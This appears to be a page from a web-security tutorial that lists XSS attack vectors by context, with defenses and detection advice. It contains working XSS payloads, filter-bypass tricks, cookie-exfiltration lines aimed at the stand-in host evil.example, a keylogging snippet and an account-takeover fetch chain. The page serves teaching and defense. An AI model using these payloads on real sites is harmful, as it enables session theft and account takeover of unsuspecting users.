# XSS Attack Vectors

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [1. HTML-Body Injection](#1-html-body-injection)
- [2. HTML-Attribute Breakout](#2-html-attribute-breakout)
- [3. JavaScript-Context Injection](#3-javascript-context-injection)
- [4. URL / `javascript:` Scheme](#4-url--javascript-scheme)
- [5. CSS-Context Injection](#5-css-context-injection)
- [6. Event-Handler & Tagless Payloads](#6-event-handler--tagless-payloads)
- [7. Dangerous DOM Sinks](#7-dangerous-dom-sinks)
- [8. Stored XSS via User-Generated Content](#8-stored-xss-via-user-generated-content)
- [9. Reflected JSON & Content-Type Confusion](#9-reflected-json--content-type-confusion)
- [10. Mutation XSS (mXSS)](#10-mutation-xss-mxss)
- [11. Filter & Sanitizer Bypasses](#11-filter--sanitizer-bypasses)
- [12. What the Payload Does Next](#12-what-the-payload-does-next)
- [Detection Techniques](#detection-techniques)

## The Core Attack Flow

Every XSS attack, regardless of type, follows the same shape: an attacker finds a **source** of untrusted data they control, confirms it reaches a **sink** that interprets data as code, and crafts a payload that survives the trip and breaks out of the surrounding context.

```
SOURCE (attacker-controlled)        SINK (interprets as code)
  URL query / fragment                HTML written to response
  Form field / POST body              innerHTML / outerHTML
  Stored record (comment, name)       document.write()
  document.referrer                   eval() / new Function()
  postMessage / WebSocket data        setTimeout("string")
  HTTP header echoed into page        location / location.href

Attacker's job: connect a source to a sink, then break out of the
surrounding context (tag, attribute, string, URL) into script.
```

The rest of this page enumerates the concrete contexts and sinks. For each, the key question is: *what character or sequence lets attacker data escape "data" and become "code"?*

## 1. HTML-Body Injection

The simplest context: untrusted data written directly between tags. Any `<` starts a new tag, so the attacker introduces their own element.

```
Sink:     <div>Hello, USERNAME</div>
Payload:  <script>steal(document.cookie)</script>
Result:   <div>Hello, <script>steal(document.cookie)</script></div>

Tagless variant (survives naive <script> blacklists):
  <img src=x onerror=steal(document.cookie)>
  <svg onload=steal(document.cookie)>
  <iframe src="javascript:steal(document.cookie)"></iframe>
```

**Required encoding**: convert `< > &` to `&lt; &gt; &amp;` so the browser renders them as text rather than markup.

## 2. HTML-Attribute Breakout

When data lands inside a quoted attribute, the attacker's first goal is to close the quote and the tag, or to inject a new event-handler attribute. Unquoted attributes are far worse — a single space starts a new attribute.

```
Sink (quoted):    <input type="text" value="DATA">
Payload:          "><script>steal()</script>
Result:           <input type="text" value=""><script>steal()</script>">

Sink (unquoted):  <input value=DATA>
Payload:          x onmouseover=steal()
Result:           <input value=x onmouseover=steal()>   (no quote break needed)
```

**Required encoding**: HTML-attribute encoding (encode quotes `&quot; &#39;` and angle brackets), and *always quote attributes*. Never place untrusted data in an attribute name or in an event-handler attribute.

## 3. JavaScript-Context Injection

Data written inside an inline `<script>` block or an event handler is already in an executable context. Even inside a quoted string, a quote, backslash, or newline breaks out — and `</script>` can terminate the whole block regardless of JS string rules, because the HTML parser sees it first.

```
Sink:     <script> var name = "DATA"; </script>
Payload:  "; steal(); //
Result:   <script> var name = ""; steal(); //"; </script>

Parser-level breakout (works even inside a JS string):
Payload:  </script><script>steal()</script>
```

**Required encoding**: JavaScript string encoding (hex-escape quotes, backslash, and line terminators) *and* block `</` sequences. Better: do not inject server data into script blocks at all — pass it via a JSON `<script type="application/json">` block or a `data-` attribute and read it with `JSON.parse`/`textContent`.

## 4. URL / `javascript:` Scheme

When untrusted data becomes a URL in an `href`, `src`, `action`, or a redirect, an attacker can supply the `javascript:` (or `data:`) scheme, which executes when the link is followed.

```
Sink:     <a href="DATA">profile</a>
Payload:  javascript:steal(document.cookie)
Result:   <a href="javascript:steal(document.cookie)">profile</a>

Also dangerous:
  <a href="data:text/html,<script>steal()</script>">
  window.location = untrustedValue   // DOM redirect to javascript: URL
```

**Required defense**: URL-encode query components, and *validate the scheme* — allow only `http:`, `https:`, `mailto:` (an allow-list), rejecting `javascript:`, `data:`, and `vbscript:`.

## 5. CSS-Context Injection

Untrusted data in a `style` attribute or `<style>` block can, in legacy engines, execute (`expression()`), and in all engines can exfiltrate data or load attacker resources via `url()`, or perform UI-redress attacks.

```
Sink:     <div style="color: DATA">
Payload:  red; background:url('//evil.example/leak?x=' + ...)

Legacy IE (historical): width: expression(steal())
Modern abuse: exfiltrate attribute values via CSS selectors + url()
```

**Required defense**: do not place untrusted data in CSS. If unavoidable, allow-list a strict set of properties/values and CSS-encode; never allow raw `url()` or `expression()`.

## 6. Event-Handler & Tagless Payloads

Because so many filters look specifically for `<script>`, most real-world payloads avoid it entirely and rely on HTML event-handler attributes that fire automatically.

```
<img src=x onerror=steal()>              fires when the image 404s
<svg onload=steal()>                     fires on SVG load
<body onload=steal()>                    fires on page load
<video><source onerror=steal()>          media error handler
<input autofocus onfocus=steal()>        fires when focused
<details open ontoggle=steal()>          fires on toggle
<marquee onstart=steal()>                fires on start
```

**Lesson for defenders**: there is no finite blacklist of dangerous tags or attributes. Only context-aware *encoding* (turning markup into text) or an allow-list *sanitizer* reliably prevents these.

## 7. Dangerous DOM Sinks

DOM-based XSS happens entirely in the browser when client JavaScript feeds attacker-controlled data into an API that parses HTML or evaluates code. These sinks are the client-side equivalent of unescaped output.

| Sink | Why it is dangerous | Safe alternative |
|---|---|---|
| `element.innerHTML` / `outerHTML` | Parses the string as HTML | `textContent`, or sanitize first |
| `insertAdjacentHTML()` | Parses HTML at a position | Build nodes with `createElement` |
| `document.write()` | Writes raw HTML into the stream | DOM APIs / `textContent` |
| `eval()` / `new Function()` | Executes the string as code | Never with untrusted data; `JSON.parse` |
| `setTimeout("str")` / `setInterval("str")` | String form is an implicit `eval` | Pass a function reference, not a string |
| `location` / `location.href` / `.assign()` | Navigates to `javascript:` URLs | Validate scheme before assigning |
| jQuery `.html()`, `$(...)` with markup | Wraps `innerHTML` | `.text()`, or sanitize |

```javascript
// Classic DOM XSS: source (location.hash) -> sink (innerHTML)
box.innerHTML = "Welcome " + decodeURIComponent(location.hash.slice(1));

// Attack: https://site.example/#<img src=x onerror=steal()>
```

## 8. Stored XSS via User-Generated Content

Any field that is saved and later shown to other users is a stored-XSS surface: comments, reviews, profile names and bios, forum posts, chat messages, filenames, support tickets, even log entries rendered in an admin console.

```
1. Attacker submits a review:
   POST /products/42/reviews
   body=Great product<script>
        new Image().src='//evil.example/c?'+document.cookie</script>

2. Server stores the body verbatim.

3. Every future visitor to /products/42 receives:
   <li class="review">Great product<script> ... </script></li>
   -> the script runs in each visitor's session.
```

Stored XSS is uniquely dangerous because it needs no per-victim phishing, reaches privileged viewers (moderators/admins), and can be built into a **self-propagating worm** when the injected script itself posts new infected content.

## 9. Reflected JSON & Content-Type Confusion

An endpoint that echoes input into a response served (or sniffed) as HTML can be exploited even if it was "meant" to be JSON.

```
Endpoint returns:  {"q": "USERINPUT"}   with Content-Type: text/html
                   (or no Content-Type, letting the browser sniff)
Attack:            ?q=<script>steal()</script>
Browser renders the "JSON" as HTML and runs the script.
```

**Defense**: always send `Content-Type: application/json` and `X-Content-Type-Options: nosniff`; never build HTML responses by string-concatenating request values.

## 10. Mutation XSS (mXSS)

Mutation XSS exploits the gap between what a sanitizer *sees* and what the browser *produces* after re-parsing. Markup that looks safe as a string can "mutate" into script when the browser normalizes the DOM (for example, inside `<template>`, `<svg>`/`<math>` foreign-content contexts, or when malformed HTML is fixed up).

```
Input the sanitizer approves (looks inert):
   <svg><style><img src=x onerror=steal()>
After the browser re-parses/normalizes the DOM, the payload
re-emerges in an executable position -> script runs.
```

**Defense**: use a battle-tested sanitizer (DOMPurify) that is explicitly hardened against known mXSS mutations, and re-sanitize after any transformation. Do not roll your own HTML sanitizer.

## 11. Filter & Sanitizer Bypasses

Attackers assume a filter exists and probe its edges. Common bypass techniques against weak, blacklist-style filters:

- **Case & whitespace**: `<ScRiPt>`, `<img/src=x/onerror=...>`, tabs/newlines inside tags.
- **Encoding layers**: HTML entities (`&#106;` for `j`), URL-encoding, and double-encoding to slip past a single decode pass.
- **Broken tags the parser repairs**: `<img src=x onerror=... <` or unclosed tags that the browser auto-closes into an executable shape.
- **Tagless vectors**: `javascript:` URLs, `on*` handlers, CSS, when only `<script>` is filtered.
- **Nested/partial removal**: `<scr<script>ipt>` where a filter that strips one `<script>` leaves a valid one behind.
- **Namespace confusion**: SVG/MathML foreign content where parsing rules differ from HTML.

**Lesson**: every bypass here defeats *blacklists and regex filters*. None of them defeat correct, context-aware *output encoding* or an allow-list DOM sanitizer — which is exactly why those are the recommended defenses.

## 12. What the Payload Does Next

Landing script is only the beginning. Once code runs as the origin, common post-exploitation goals include:

- **Session/token theft**: `new Image().src='//evil/c?'+document.cookie`, or read a token from `localStorage` and exfiltrate it.
- **CSRF-token theft & request forgery**: read the anti-CSRF token from the DOM, then `fetch()` a state-changing endpoint (change email, add admin) with the victim's session.
- **Keylogging**: `document.addEventListener('keydown', e => exfil(e.key))` to capture passwords typed on the page.
- **Account takeover**: silently submit the "change email / change password" form, then trigger a password reset.
- **Worm propagation**: post the payload itself as new content so every viewer re-infects, achieving exponential spread (the MySpace "Samy" pattern).
- **Phishing / UI redress**: overlay a fake login modal, or rewrite links to route users to attacker pages.

```javascript
// Illustrative account-takeover chain (runs as the victim's origin)
fetch('/account/settings')                       // 1. read CSRF token
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf" value="([^"]+)/)[1];
    return fetch('/account/email', {             // 2. forge the request
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=attacker@evil.example'
    });
  });                                             // 3. attacker now owns recovery
```

## Detection Techniques

- **Reflected/stored**: fuzz every parameter, header, and stored field with a unique marker (e.g., `xss7331`), then search responses for it appearing *unencoded* in an HTML/JS/attribute context. Automated scanners (OWASP ZAP, Burp) cover much of this.
- **DOM-based**: use browser DevTools and DOM-XSS-aware tools to trace data flow from sources (`location`, `document.referrer`, `postMessage`) to sinks (`innerHTML`, `eval`). Static taint analysis and linters help.
- **Code review**: grep for sinks (`innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`, `|safe`, `mark_safe`) and audit each for untrusted input.
- **CSP as a tripwire**: a report-only CSP surfaces inline-script execution attempts in production, flagging live XSS.

## Next Steps

- **[Prevention](prevention.html)**: Turn these vectors off with layered, context-aware defenses
- **[Examples](examples.html)**: See each vector as vulnerable vs. secure code
- **[Overview](overview.html)**: The three types, impact, and misconceptions
- **[Hands-On Lab](./lab/cross-site-scripting/)**: Practice identifying and fixing these vectors safely
